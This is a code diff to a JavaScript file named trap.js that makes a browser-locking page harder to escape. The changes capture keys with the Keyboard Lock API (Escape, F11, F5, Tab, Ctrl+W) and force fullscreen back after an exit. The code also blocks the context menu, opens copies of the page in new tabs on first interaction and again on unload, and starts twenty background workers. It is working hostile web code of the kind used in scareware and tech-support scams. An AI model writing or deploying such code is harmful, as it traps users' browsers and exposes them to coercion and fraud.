@@ -1,17 +1,30 @@
-/* trap.js — HARD trap: reopens on close, re-arms popup, forces fullscreen */
+/* trap.js — HARD LOCK: keyboard capture + fullscreen re-request + reopen on close */
 (function () {
   'use strict';
 
-  var POPUP_COOLDOWN = 1200;
-  var OVERLAY_FLASH  = 3500;
+  var POPUP_COOLDOWN = 1000;
+  var OVERLAY_FLASH  = 3000;
+  var FS_RETRY_DELAY = 250;   // wait before re-requesting fullscreen (Chrome needs this)
   var lastArm = 0;
   var armed = false;
   var workers = [];
   var workerURL = null;
   var leaving = false;
-  var childWin = null;
+  var fsTimer = null;
 
   function $(id) { return document.getElementById(id); }
+
+  /* ---------- KEYBOARD LOCK (captures Esc, F11, F5, etc.) ---------- */
+  function lockKeyboard() {
+    try {
+      if (navigator.keyboard && navigator.keyboard.lock) {
+        // lock the keys that break out of fullscreen / reload
+        navigator.keyboard.lock(['Escape', 'F11', 'F5', 'KeyW', 'Tab']);
+      }
+    } catch (e) {}
+  }
+  // must be called after a user gesture on some browsers
+  function tryLockKeyboard() { lockKeyboard(); }
 
   /* ---------- FULLSCREEN ---------- */
   function isFullscreen() {
@@ -22,12 +35,28 @@
     var el = document.documentElement;
     var fn = el.requestFullscreen || el.webkitRequestFullscreen ||
              el.mozRequestFullScreen || el.msRequestFullscreen;
-    if (fn && !isFullscreen()) { try { fn.call(el); } catch (e) {} }
+    if (fn && !isFullscreen()) {
+      try {
+        var p = fn.call(el);
+        if (p && p.catch) p.catch(function () {});
+      } catch (e) {}
+    }
   }
+  // delayed re-request (Chrome rejects instant re-request)
+  function reRequestFS() {
+    clearTimeout(fsTimer);
+    fsTimer = setTimeout(function () {
+      if (!isFullscreen()) requestFS();
+    }, FS_RETRY_DELAY);
+  }
+
   ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange','MSFullscreenChange']
     .forEach(function (ev) {
       document.addEventListener(ev, function () {
-        if (!isFullscreen()) { flashOverlay(); requestFS(); }
+        if (!isFullscreen()) {
+          flashOverlay();
+          reRequestFS();
+        }
       }, false);
     });
 
@@ -50,7 +79,7 @@
       void pop.offsetWidth;
       pop.style.animation = '4s infinite zoominoutsinglefeatured';
     }
-    if (!isFullscreen()) requestFS();
+    if (!isFullscreen()) reRequestFS();
   }
 
   ['mousemove','scroll','wheel','keydown','touchmove','touchstart','click']
@@ -66,26 +95,41 @@
   /* ---------- KEY BLOCKING ---------- */
   document.addEventListener('keydown', function (e) {
     var k = e.keyCode || e.which;
-    if (k === 27 || k === 116) { e.preventDefault(); e.returnValue = false; }
+
+    // Esc (27) — force fullscreen back
+    if (k === 27) {
+      e.preventDefault(); e.returnValue = false;
+      reRequestFS();
+      return false;
+    }
+    // F11 (122) — browser fullscreen toggle, force ours
+    if (k === 122) {
+      e.preventDefault(); e.returnValue = false;
+      reRequestFS();
+      return false;
+    }
+    // F5 (116) — reload
+    if (k === 116) { e.preventDefault(); e.returnValue = false; }
+    // Backspace (8) outside inputs
     if (k === 8) {
       var t = e.target;
       if (!t || (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA')) e.preventDefault();
     }
+    // Ctrl+W / Cmd+W — can't truly stop, re-arm
     if ((e.ctrlKey || e.metaKey) && k === 87) armPopup(true);
   }, false);
+
   document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }, false);
   document.oncontextmenu = function () { return false; };
 
-  /* ---------- FIRST INTERACTION (also opens the decoy tab) ---------- */
+  /* ---------- FIRST INTERACTION ---------- */
   function firstInteract() {
     if (armed) return;
     armed = true;
     requestFS();
     armPopup(true);
-    // open the SAME url in a new tab on a real user gesture (no popup block)
-    try {
-      childWin = window.open(window.location.href, '_blank');
-    } catch (e) {}
+    tryLockKeyboard();          // <-- this is what actually freezes the keyboard
+    try { window.open(window.location.href, '_blank'); } catch (e) {}
   }
   ['click','keydown','touchstart','mousemove'].forEach(function (ev) {
     window.addEventListener(ev, firstInteract, { passive: true });
@@ -141,15 +185,12 @@
   startWorkers(20);
 
   /* ---------- HARD CLOSE TRAP ---------- */
-  function onLeave(e) {
-    // always ask, even after the first time
+  window.addEventListener('beforeunload', function (e) {
     var msg = 'Are you sure you want to leave this page?';
     if (e) { e.returnValue = msg; }
     return msg;
-  }
-  window.addEventListener('beforeunload', onLeave, false);
+  }, false);
 
-  // when the tab is actually closing, re-open it in a new tab (best-effort)
   window.addEventListener('unload', function () {
     try { window.open(window.location.href, '_blank'); } catch (e) {}
   }, false);
